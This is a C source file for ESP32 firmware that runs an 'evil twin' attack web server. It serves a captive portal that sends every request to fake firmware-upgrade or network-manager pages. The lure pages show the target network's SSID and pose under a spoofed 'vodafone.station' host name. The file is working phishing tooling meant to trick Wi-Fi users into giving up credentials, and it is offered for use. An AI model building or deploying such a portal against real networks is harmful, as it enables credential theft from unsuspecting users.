#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "spi_flash_mmap.h"

#include "esp_wifi.h"
#include "esp_event.h"
#include "freertos/event_groups.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/api.h>
#include <lwip/netdb.h>
#include "esp_http_server.h"

#include "server.h"
#include "evil_twin.h"

#include "web/web_page.h"
#include "web/web_net_manager.h"
#include "web/bootstrap_min_css.h"
#include "web/bootstrap_min_js.h"
#include "web/jquery_min_js.h"

#include "web/firmware_upgrade/index.h"
#include "web/firmware_upgrade/loading.h"
#include "web/firmware_upgrade/upgrading.h"

#define CHUNK_SIZE 256

static const char *TAG = "HTTPD";	//TAG for debug
static const char *host = "vodafone.station";
static const char *captive_portal_url = "http://192.168.4.1/index.html";
static httpd_handle_t server = NULL;
static target_info_t target = { 0 };


static void httpd_send_chunked_data(httpd_req_t *req, const char *buffer, size_t len)
{
	size_t bytes_remaining = len;
    size_t offset = 0;
	httpd_resp_set_hdr(req, "Connection", "keep-alive");
    while (bytes_remaining > 0) 
	{
        size_t chunk_size = (bytes_remaining > CHUNK_SIZE) ? CHUNK_SIZE : bytes_remaining;
        httpd_resp_send_chunk(req, buffer + offset, chunk_size);
        offset += chunk_size;
        bytes_remaining -= chunk_size;
    }
	httpd_resp_send_chunk(req, NULL, 0);
}


static void web_net_manager_scheme(httpd_req_t *req)
{
	httpd_resp_set_type(req, "text/html");
	httpd_resp_send_chunk(req, fake_web_base_network_manager0, sizeof(fake_web_base_network_manager0));
	httpd_resp_send_chunk(req, (char *)&target.ssid, strlen((char *)&target.ssid));
	httpd_send_chunked_data(req, fake_web_base_network_manager, sizeof(fake_web_base_network_manager));
	httpd_resp_send(req, NULL, 0);
}


static void captive_portal_redirect(httpd_req_t *req)
{
	/* Index */
	if( strcmp(req->uri, "/index.html") == 0 )
	{
		switch(target.attack_scheme)
		{
			case FIRMWARE_UPGRADE:
				httpd_send_chunked_data(req, fu_index_html, sizeof(fu_index_html));
				break;
			
			case WEB_NET_MANAGER:
				web_net_manager_scheme(req);
				break;

			case PLUGIN_UPDATE:
				break;

			case OAUTH_LOGIN:
				break;

			default:
				break;
		}
		return;
	}
	/* loading.html */
	else if( strcmp(req->uri, "/loading.html") == 0 )
	{
		switch(target.attack_scheme)
		{
			case FIRMWARE_UPGRADE:
				httpd_send_chunked_data(req, fu_loading_html, sizeof(fu_loading_html));
				break;
			
			case WEB_NET_MANAGER:
				web_net_manager_scheme(req);
				break;

			case PLUGIN_UPDATE:
				break;

			case OAUTH_LOGIN:
				break;

			default:
				break;
		}
		return;
	}
	/* upgrading.html */
	else if( strcmp(req->uri, "/upgrading.html") == 0 )
	{
		switch(target.attack_scheme)
		{
			case FIRMWARE_UPGRADE:
				httpd_send_chunked_data(req, fu_upgrading_html, sizeof(fu_upgrading_html));
				break;
			
			case WEB_NET_MANAGER:
				web_net_manager_scheme(req);
				break;

			case PLUGIN_UPDATE:
				break;

			case OAUTH_LOGIN:
				break;

			default:
				break;
		}
		return;
	}
	/* bootstrap.min.css */
	else if( strcmp(req->uri, "/static/bootstrap.min.css") == 0 )
	{
		httpd_resp_set_type(req, "text/css");
		httpd_send_chunked_data(req, bootstrap_min_css, sizeof(bootstrap_min_css));
	}
	/* bootstrap.min.js */
	else if( strcmp(req->uri, "/static/bootstrap.min.js") == 0 )
	{
		httpd_resp_set_type(req, "application/javascript");
		httpd_send_chunked_data(req, bootstrap_min_js, sizeof(bootstrap_min_js));
	}
	/* jquery.min.js */
	else if( strcmp(req->uri, "/static/jquery.min.js") == 0 )
	{
		httpd_resp_set_type(req, "application/javascript");
		httpd_send_chunked_data(req, jquery_min_js, sizeof(jquery_min_js));
	}
	/* favicon.ico */
	else if( strcmp(req->uri, "/favicon.ico") == 0 )
	{
		httpd_resp_send(req, NULL, 0);
	}
	/* Activate captive portal */
	else
	{
		httpd_resp_set_status(req, "302 Found");
		httpd_resp_set_hdr(req, "Host", host);
		httpd_resp_set_hdr(req, "Location", captive_portal_url);
		httpd_resp_send(req, NULL, 0);
		return;
	}
}


static esp_err_t redirect_handler(httpd_req_t *req) 
{
	/* Request information */
	char Host[64] = { 0 };
	char UserAgent[128] = { 0 };
	char ContentType[64] = { 0 };
	char ContentLen[8] = { 0 };
	char Referer[64] = { 0 };

	/* Read request header */
	int len = httpd_req_get_hdr_value_len(req, "Host");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Host", Host, len+1);
    }
	len = httpd_req_get_hdr_value_len(req, "User-Agent");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "User-Agent", UserAgent, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Type");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Type", ContentType, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Length");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Length", ContentLen, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Referer");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Referer", Referer, len);
    }

	captive_portal_redirect(req);

    return ESP_OK;
}


void http_attack_server_start(target_info_t *_target_info)
{
	if( server != NULL )
	{
		ESP_LOGE(TAG, "Attack server already started.");
		return;
	}

	/* Copy target info */
	memcpy(&target, _target_info, sizeof(target_info_t));

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
	config.ctrl_port = 81;
	config.server_port = 80;
	config.uri_match_fn = httpd_uri_match_wildcard;
	config.max_open_sockets = 10;
	config.max_resp_headers = 16;
	config.recv_wait_timeout = 10;
	config.send_wait_timeout = 10;
	config.lru_purge_enable = true;

    if (httpd_start(&server, &config) == ESP_OK) 
	{
        httpd_uri_t redirect_uri = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = redirect_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(server, &redirect_uri);
    }
	else
	{
		ESP_LOGE(TAG, "Failed to start captive portal server.");
	}
}


void http_attack_server_stop(void)
{
	if( server != NULL )
    {
        if( httpd_stop(server) != ESP_OK )
        {
            ESP_LOGD(TAG, "Failed to stop attack server.");
            return;
        }
    }
}